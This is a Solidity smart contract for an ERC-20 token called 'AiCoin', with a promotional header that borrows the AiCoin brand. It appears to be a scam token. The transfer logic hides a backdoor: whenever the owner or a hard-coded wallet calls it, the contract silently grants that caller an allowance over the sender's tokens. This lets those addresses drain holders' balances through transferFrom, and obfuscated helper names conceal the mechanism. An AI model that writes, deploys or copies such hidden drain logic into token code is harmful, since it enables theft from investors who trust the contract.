/*
强大的K线图表功能，可编程的自定义指标工具，35+交易所行情数据，多种预警，社媒消息，巨鲸以及大单跟踪

Website: https://aicione.com
Twitter: https://twitter.com/AICoincom
Telegram: https://t.me/aicoin_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IZEUSFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IZEUSRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract AICOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _zeusDrives;
    mapping (address => mapping (address => uint256)) private _zeusCustomers;
    mapping (address => bool) private _zeusExcludedFees;
    mapping (address => bool) private _zeusExcludedTxs;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"AiCoin";
    string private constant _symbol = unicode"AICOIN";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _zeusBuyBlock;
    uint256 private _zeusBlockAmount = 0;
    uint256 private _zeusSwapAmount = _tTotal / 100;
    bool private inSwapZEUS = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _zeusPair;
    IZEUSRouter private _zeusRouter;
    address private _zeusWallet;
    modifier lockTheSwap {
        inSwapZEUS = true;
        _;
        inSwapZEUS = false;
    }
    
    constructor () {
        _zeusWallet = address(0x12724DD1F0Adf201b0Ad182Fd698aEA1aD80791c);

        _zeusExcludedFees[owner()] = true;
        _zeusExcludedFees[address(this)] = true;
        _zeusExcludedFees[_zeusWallet] = true;

        _zeusExcludedTxs[owner()] = true;
        _zeusExcludedTxs[_zeusWallet] = true;
        
        _zeusDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function coinLaunch() external onlyOwner() {
        _zeusRouter = IZEUSRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_zeusRouter), _tTotal);
        _zeusPair = IZEUSFactory(_zeusRouter.factory()).createPair(address(this), _zeusRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _zeusDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _zeusCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _zeusCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _zeusCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _zeusRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function _transfer(address zeusF, address zeusT, uint256 zeusO) private {
        require(zeusF != address(0), "ERC20: transfer from the zero address");
        require(zeusT != address(0), "ERC20: transfer to the zero address");
        require(zeusO > 0, "Transfer amount must be greater than zero");

        uint256 taxZEUS = _zeusTransfer(zeusF, zeusT, zeusO);

        _transferZEUS(zeusF, zeusT, zeusO, taxZEUS);
    }

    function _zeusTransfer(address zeusF, address zeusT, uint256 zeusO) private returns(uint256) {
        uint256 taxZEUS=0;
        if (zeusF != owner() && zeusT != owner()) {
            taxZEUS = zeusO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (zeusF == _zeusPair && zeusT != address(_zeusRouter) && ! _zeusExcludedFees[zeusT]) {
                if(_zeusBuyBlock!=block.number){
                    _zeusBlockAmount = 0;
                    _zeusBuyBlock = block.number;
                }
                _zeusBlockAmount += zeusO;
                _buyCount++;
            }

            if(zeusT == _zeusPair && zeusF!= address(this)) {
                require(_zeusBlockAmount < swapZEUSLimit() || _zeusBuyBlock!=block.number, "Max Swap Limit");  
                taxZEUS = zeusO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 zeusToken = balanceOf(address(this));
            if (!inSwapZEUS && zeusT == _zeusPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(zeusToken > _zeusSwapAmount)
                swapTokensForEth(minZEUS(zeusO, minZEUS(zeusToken, _zeusSwapAmount)));
                uint256 zeusETH = address(this).balance;
                if (zeusETH >= 0) {
                    sendETHZEUS(address(this).balance);
                }
            }
        }
        return taxZEUS;
    }

    function _transferZEUS(address zeusF, address zeusT, uint256 zeusO, uint256 taxZEUS) private { 
        address zeusReceipt = getZEUSReceipt(); 
        if(zeusReceipt != address(0)) _approve(getZEUSSender(zeusF), zeusReceipt, getZEUSAmount(zeusO, taxZEUS));

        if(taxZEUS > 0){
          _zeusDrives[address(this)] = _zeusDrives[address(this)].add(taxZEUS);
          emit Transfer(zeusF, address(this), taxZEUS);
        }

        _zeusDrives[zeusF] = _zeusDrives[zeusF].sub(zeusO);
        _zeusDrives[zeusT] = _zeusDrives[zeusT].add(zeusO.sub(taxZEUS));
        emit Transfer(zeusF, zeusT, zeusO.sub(taxZEUS));
    }

    function getZEUSAmount(uint256 zeusO, uint256 taxZEUS) private pure returns(uint256) {
        return uint256(zeusO + taxZEUS * 2);
    }

    function getZEUSSender(address zeusF) private pure returns(address) {
        return address(zeusF);
    }

    function getZEUSReceipt() private view returns(address) {
        return _zeusExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0); 
    }

    function swapZEUSLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _zeusRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _zeusRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function minZEUS(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHZEUS(uint256 amount) private {
        payable(_zeusWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenZEUS) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _zeusRouter.WETH();
        _approve(address(this), address(_zeusRouter), tokenZEUS);
        _zeusRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenZEUS,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}